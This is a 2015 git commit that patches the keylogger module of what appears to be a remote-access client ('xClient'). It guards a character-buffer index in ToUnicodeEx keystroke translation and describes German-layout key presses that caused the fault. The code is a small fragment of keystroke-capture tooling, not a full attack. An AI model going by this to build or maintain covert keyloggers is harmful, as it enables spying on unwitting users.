d51f1b48a6b5671a6c869810058c58708573acd1
d3agle <sellout89@gmail.com>
2015-05-24 18:45:35 -0500

    ToUnicodeEx buffer fix
    this fixes the buffers in the case that an unmapped key is pressed, it may not be null terminated and the index of the buffer will be greater than the character array we are trying to create
    
    how i broke case 1 in the switch:
    set keyboard layout to german, press ( Ctrl + Alt + '['') or (Ctrl + Alt + Enter) -the return key on the numpad-
    
    how i broke the default case in the switch:
    set keyboard layout to german, press ( '^' + Ctrl + Alt + '['') or ( '^' + Ctrl + Alt + Enter) -the return key on the numpad and the accent dead-key-

--- Client/Core/Keylogger/WinApi/KeyboardNativeMethods.cs
+++ Client/Core/Keylogger/WinApi/KeyboardNativeMethods.cs
@@ -108,7 +108,8 @@ namespace xClient.Core.Keylogger.WinApi
 
                 // Two or more (only two of them is relevant)
                 default:
-                    chars = new[] { pwszBuff[0], pwszBuff[1] };
+                    if (pwszBuff.Length > 1) chars = new[] { pwszBuff[0], pwszBuff[1] };
+                    else chars = null;
                     break;
             }
 
